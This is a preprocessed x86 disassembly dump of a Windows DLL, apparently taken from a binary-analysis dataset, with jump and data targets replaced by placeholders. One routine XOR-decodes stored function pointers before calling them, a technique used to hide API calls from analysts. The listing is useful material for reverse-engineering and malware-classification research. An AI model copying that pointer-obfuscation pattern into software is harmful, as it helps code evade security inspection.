mov edx [ ebx + esi ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + esi ]
push edx
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ ebx + esi ]
mov [ ebx + esi ] ecx
mov [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ edi ] eax
mov eax [ esi ]
mov ecx [ ebx + esi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebx + esi ]
mov eax [ ecx + esi ]
mov [ ecx + esi ] edx
mov [ ebx + esi ] eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ esi ] eax
mov ecx [ edi ]
mov eax edi
sub eax ebx
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ ebx + esi ]
mov [ ebx + esi ] edx
mov [ esi ] eax
mov eax [ edi ]
mov ecx [ ebx + edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ edi ]
push ecx
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebx + edi ]
mov [ ebx + edi ] edx
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov ecx eax
sub eax [ ebp - 0xc ]
sub ecx ebx
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
mov eax [ ebp - 0x4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push eax
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx [ eax ]
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov edx [ ebx + esi ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx ]
mov edx [ edx ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ eax ]
push ecx
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + esi ]
mov eax [ edi ]
mov [ edi ] ecx
mov [ ebx + esi ] eax
mov eax [ ebx + esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ edi ]
mov eax [ ecx ]
mov [ ecx ] edx
mov [ edi ] eax
mov edx [ ebx + esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ebx + esi ] eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10054f70
push ebp
mov ebp esp
push 0xffffffff
push sub_10086f38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10034ec0
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x18 ]
push 0x20
mov ecx ebx
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_10069747
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_10055030
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
sub eax edi
mov ecx eax
and ecx 0xfffffffc
cmp ecx 0x4
jle r-xdata
pop edi
mov esp ebp
pop ebp
retn
push esi
mov edx [ edi + eax - 0x4 ]
mov ecx [ edi ]
lea esi [ eax - 0x4 ]
mov [ edi + eax - 0x4 ] ecx
mov [ ebp - 0x4 ] edx
push ebx
lea edx [ ebp - 0x4 ]
mov eax esi
sar eax 0x2
push edx
push eax
xor eax eax
call sub_1001dab0
mov eax esi
mov ecx esi
and ecx 0xfffffffc
add esp 0xc
cmp ecx 0x4
jg r-xdata
pop esi
sub_1005507b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1001821c
pop ecx
pop ebp
retn
sub_100550b0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10055110
push ebp
mov ebp esp
push 0xffffffff
push sub_1008701c
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ebx 0x7
xor edi edi
xor eax eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov [ ebp - 0x4 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
xor ecx ecx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] edi
mov [ esi + 0x24 ] cx
xor edx edx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] edi
mov [ esi + 0x40 ] dx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] ax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] cx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] dx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc0 ] edi
mov [ esi + 0xb0 ] ax
mov [ esi + 0xe0 ] ebx
mov [ esi + 0xdc ] edi
mov [ esi + 0xcc ] cx
lea ecx [ esi + 0xe8 ]
mov [ ebp - 0x4 ] bl
push 0x1
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push r--data
mov [ ecx ] dx
call sub_1005ddc0
lea ecx [ esi + 0x104 ]
mov [ ebp - 0x4 ] 0x8
push 0x1
xor eax eax
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push r--data
mov [ ecx ] ax
call sub_1005ddc0
mov [ esi + 0x120 ] edi
mov [ esi + 0x124 ] edi
mov [ esi + 0x128 ] edi
mov [ esi + 0x12c ] edi
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ esi + 0x138 ] edi
push edi
mov [ esi + 0x13c ] edi
push edi
mov [ esi + 0x140 ] edi
call [ CoInitializeEx@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10055260
push ebp
mov ebp esp
push 0xffffffff
push sub_10086920
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
sar eax 0x1
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp sub_100552d0
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10028950
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_100552d0
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_1000831a
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1003f800
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100552d0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100552d0
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100552d0
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100552d0
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1005532d
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10024fe9
test edi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100552d0
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100552d0
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100552d0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100552d0
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_100553e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088502
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10059920
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
push edx
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10059920
push 0xffffffff
push edx
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ecx ] dl
call sub_1004efe0
sub_100554c6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
push esi
call sub_10035d06
pop ecx
sub_10055530
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop edi
retn
push eax
call edi
sub_10055589
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_100136d5
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10038a17
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10038a17
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_10055649
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
pop ebp
retn 0x4
sub_100556a0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_1005fbb8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_100556e0
push ebp
mov ebp esp
sub esp 0x6b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x6ac ] edi
mov [ ebp - 0x6b0 ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x1
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
push ebx
lea edx [ ebp - 0x6a8 ]
mov eax 0x1
call sub_100550b0
lea edx [ ebp - 0x6a4 ]
mov eax 0x4
call sub_100550b0
lea edx [ ebp - 0x6a0 ]
mov eax 0x2
call sub_100550b0
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x69c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x6a4 ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop ebx
pop edi
lea eax [ edx + 0x5 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x6a0 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x6a4 ]
push eax
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push edi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea edx [ ebp - 0x6a4 ]
push edx
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
mov edi [ ebp - 0x6ac ]
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x6a0 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x6a8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea ecx [ ebp - 0x6a4 ]
push ecx
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x84 ]
xor eax eax
call sub_100550b0
mov edx [ ebp - 0x6b0 ]
push 0x1
push edx
lea ecx [ ebp - 0x69c ]
lea eax [ ebp - 0x84 ]
mov edx 0x80000002
call sub_10047450
add esp 0x8
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10055a33
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10055ac0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
call sub_10021f70
mov ecx [ esi + 0x10 ]
push ecx
push edi
call sub_10021f70
push esi
push edi
call sub_10021f70
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_10055aed
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_10018a5d
push r--data
push r--data
call sub_1000fedb
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_10048300
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_1002b202
call sub_100592b3
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_10048300
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10055ba0
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_100362a0
mov [ esi + 0x4 ] 0x2
cmp [ ebx + 0x20 ] 0x8
jb r-xdata
add ebx 0xc
mov ebx [ ebx + 0xc ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f5d0
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10055c30
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10055d00
push ebp
mov ebp esp
push 0xffffffff
push sub_10088f7e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
